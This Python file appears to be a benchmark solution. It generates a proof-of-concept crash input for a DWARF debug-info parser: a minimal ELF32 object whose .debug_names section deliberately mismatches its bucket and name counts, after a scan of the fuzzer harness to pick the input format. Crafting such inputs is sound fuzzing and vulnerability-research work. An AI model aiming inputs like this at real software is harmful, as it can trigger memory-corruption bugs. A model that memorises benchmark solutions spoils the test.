import os
import io
import re
import struct
import tarfile
from typing import List, Tuple, Optional


def _build_debug_info_minimal_dwarf5() -> bytes:
    # Minimal DWARF5 CU with no DIEs: abbrev code 0 terminator.
    version = 5
    unit_type = 0x01  # DW_UT_compile
    address_size = 4  # for ELF32
    abbrev_offset = 0
    body = struct.pack("<HBBI", version, unit_type, address_size, abbrev_offset) + b"\x00"
    unit_length = len(body)
    return struct.pack("<I", unit_length) + body


def _build_debug_abbrev_minimal() -> bytes:
    # Single 0 byte marks end of abbreviations.
    return b"\x00"


def _build_debug_str_minimal() -> bytes:
    return b"\x00"


def _build_debug_names_poc(bucket_count: int = 1, name_count: int = 64,
                           abbrev_table_size: int = 1, augmentation_string_size: int = 1) -> bytes:
    # DWARF5 .debug_names unit with potentially dangerous mismatch between bucket_count and name_count.
    # Header after unit_length:
    # version u2, padding u2,
    # cu_count u4, local_tu_count u4, foreign_tu_count u4,
    # bucket_count u4, name_count u4, abbrev_table_size u4, augmentation_string_size u4
    header = struct.pack(
        "<HHIIIIIII",
        5, 0,
        0, 0, 0,
        bucket_count, name_count, abbrev_table_size, augmentation_string_size
    )

    aug = (b"\x00" * augmentation_string_size) if augmentation_string_size else b""

    # No CU/TU/foreign arrays (counts are 0).

    # Buckets: u4[bucket_count]. Use 1-based index into hash array. 0 means empty.
    buckets = b""
    if bucket_count > 0:
        buckets = struct.pack("<" + "I" * bucket_count, *([1] + [0] * (bucket_count - 1)))

    # Hashes u4[name_count]
    # Choose monotonically increasing to satisfy potential expectations.
    hashes = struct.pack("<" + "I" * name_count, *list(range(1, name_count + 1)))

    # String offsets u4[name_count] -> all 0 => points to empty string in .debug_str
    str_offs = b"\x00" * (4 * name_count)

    # Entry offsets u4[name_count] -> all 0 => points to start of entry pool
    entry_offs = b"\x00" * (4 * name_count)

    # Abbrev table: provide a single 0 ULEB to terminate abbreviations
    abbrev_table = b"\x00" * max(0, abbrev_table_size)

    # Entry pool: provide a single 0 ULEB to terminate entry list
    entry_pool = b"\x00"

    content = header + aug + buckets + hashes + str_offs + entry_offs + abbrev_table + entry_pool
    unit_length = len(content)
    return struct.pack("<I", unit_length) + content


def _align_up(x: int, a: int) -> int:
    if a <= 1:
        return x
    return (x + (a - 1)) & ~(a - 1)


def _build_elf32_rel(sections: List[Tuple[str, int, int, int, bytes]]) -> bytes:
    # sections: (name, sh_type, sh_flags, sh_addralign, data)
    # We'll build: [NULL, .shstrtab, ...sections...]
    # Elf32_Ehdr: 52 bytes, Elf32_Shdr: 40 bytes.

    # Build shstrtab
    names = ["", ".shstrtab"] + [s[0] for s in sections]
    shstrtab = b"\x00"
    name_offsets = [0]
    for n in names[1:]:
        name_offsets.append(len(shstrtab))
        shstrtab += n.encode("ascii", "strict") + b"\x00"

    # Layout
    ehdr_size = 52
    file_off = ehdr_size

    # Section 0: NULL
    shdrs = []

    # Section 1: shstrtab
    shstrtab_align = 1
    file_off = _align_up(file_off, shstrtab_align)
    shstrtab_off = file_off
    shstrtab_size = len(shstrtab)
    file_off += shstrtab_size

    sec_offsets = [0, shstrtab_off]
    sec_sizes = [0, shstrtab_size]

    # Other sections
    for (name, sh_type, sh_flags, sh_align, data) in sections:
        sh_align = max(1, int(sh_align))
        file_off = _align_up(file_off, sh_align)
        sec_offsets.append(file_off)
        sec_sizes.append(len(data))
        file_off += len(data)

    # Section header table
    shentsize = 40
    shnum = 2 + len(sections)
    shoff = _align_up(file_off, 4)
    file_size = shoff + shentsize * shnum

    out = bytearray(b"\x00" * file_size)

    # Write section contents
    out[shstrtab_off:shstrtab_off + shstrtab_size] = shstrtab

    for i, (_, _, _, _, data) in enumerate(sections, start=2):
        off = sec_offsets[i]
        out[off:off + len(data)] = data

    # ELF header
    e_ident = bytearray(16)
    e_ident[0:4] = b"\x7fELF"
    e_ident[4] = 1  # ELFCLASS32
    e_ident[5] = 1  # ELFDATA2LSB
    e_ident[6] = 1  # EV_CURRENT
    e_ident[7] = 0  # ELFOSABI_NONE
    e_type = 1       # ET_REL
    e_machine = 3    # EM_386
    e_version = 1
    e_entry = 0
    e_phoff = 0
    e_flags = 0
    e_ehsize = ehdr_size
    e_phentsize = 0
    e_phnum = 0
    e_shentsize = shentsize
    e_shnum = shnum
    e_shstrndx = 1

    ehdr = struct.pack(
        "<16sHHIIIIIHHHHHH",
        bytes(e_ident),
        e_type, e_machine, e_version,
        e_entry, e_phoff, shoff,
        e_flags,
        e_ehsize, e_phentsize, e_phnum,
        e_shentsize, e_shnum, e_shstrndx
    )
    out[0:ehdr_size] = ehdr

    # Section headers
    def shdr_pack(sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size, sh_link, sh_info, sh_addralign, sh_entsize):
        return struct.pack("<IIIIIIIIII", sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size, sh_link, sh_info, sh_addralign, sh_entsize)

    # 0: NULL
    shdrs.append(shdr_pack(0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
    # 1: shstrtab
    shdrs.append(shdr_pack(name_offsets[1], 3, 0, 0, shstrtab_off, shstrtab_size, 0, 0, 1, 0))

    # Others
    for idx, (name, sh_type, sh_flags, sh_align, data) in enumerate(sections, start=2):
        sh_name = name_offsets[idx]
        sh_offset = sec_offsets[idx]
        sh_size = len(data)
        sh_addralign = max(1, int(sh_align))
        shdrs.append(shdr_pack(sh_name, int(sh_type), int(sh_flags), 0, sh_offset, sh_size, 0, 0, sh_addralign, 0))

    shdr_blob = b"".join(shdrs)
    out[shoff:shoff + len(shdr_blob)] = shdr_blob
    return bytes(out)


def _detect_input_style_from_src(src_path: str) -> str:
    # Returns "elf" or "raw"
    # Heuristic: if fuzzer harness mentions elf/dwarf_elf, assume ELF. If it appears to use
    # raw section data without ELF, assume RAW. Default ELF.
    patterns_elf = [
        b"dwarf_elf_init", b"dwarf_elf_object_access_init", b"elf_begin", b"libelf", b"ELF"
    ]
    patterns_raw = [
        b"dwarf_object_init_b", b"get_section_info", b".debug_names"
    ]

    def check_blob(blob: bytes) -> Optional[str]:
        if b"LLVMFuzzerTestOneInput" not in blob:
            return None
        if any(p in blob for p in patterns_elf):
            return "elf"
        # If it uses dwarf_object_init_b with custom access and doesn't mention elf.
        if (b"dwarf_object_init_b" in blob) and (b"elf_" not in blob) and (b"dwarf_elf" not in blob):
            return "raw"
        # If it explicitly treats input as a section buffer
        if (b".debug_names" in blob) and (b"elf_" not in blob) and (b"dwarf_elf" not in blob):
            return "raw"
        if any(p in blob for p in patterns_raw) and (b"elf_" not in blob) and (b"dwarf_elf" not in blob):
            return "raw"
        return None

    def iter_source_blobs_from_dir(d: str):
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx"}
        for root, _, files in os.walk(d):
            for fn in files:
                _, ext = os.path.splitext(fn)
                if ext.lower() not in exts:
                    continue
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                    if st.st_size > 2_000_000:
                        continue
                    with open(p, "rb") as f:
                        yield f.read()
                except OSError:
                    continue

    def iter_source_blobs_from_tar(tar_path: str):
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx"}
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    name = m.name
                    _, ext = os.path.splitext(name)
                    if ext.lower() not in exts:
                        continue
                    if m.size > 2_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        blob = f.read()
                        yield blob
                    except Exception:
                        continue
        except Exception:
            return

    it = iter_source_blobs_from_dir(src_path) if os.path.isdir(src_path) else iter_source_blobs_from_tar(src_path)
    for blob in it:
        r = check_blob(blob)
        if r:
            return r
    return "elf"


class Solution:
    def solve(self, src_path: str) -> bytes:
        style = _detect_input_style_from_src(src_path)

        debug_names = _build_debug_names_poc(
            bucket_count=1,
            name_count=64,
            abbrev_table_size=1,
            augmentation_string_size=1,
        )

        if style == "raw":
            return debug_names

        debug_info = _build_debug_info_minimal_dwarf5()
        debug_abbrev = _build_debug_abbrev_minimal()
        debug_str = _build_debug_str_minimal()

        # Build minimal ELF32 relocatable containing required DWARF sections.
        sec_list = [
            (".debug_info", 1, 0, 1, debug_info),
            (".debug_abbrev", 1, 0, 1, debug_abbrev),
            (".debug_names", 1, 0, 1, debug_names),
            (".debug_str", 1, 0, 1, debug_str),
        ]
        return _build_elf32_rel(sec_list)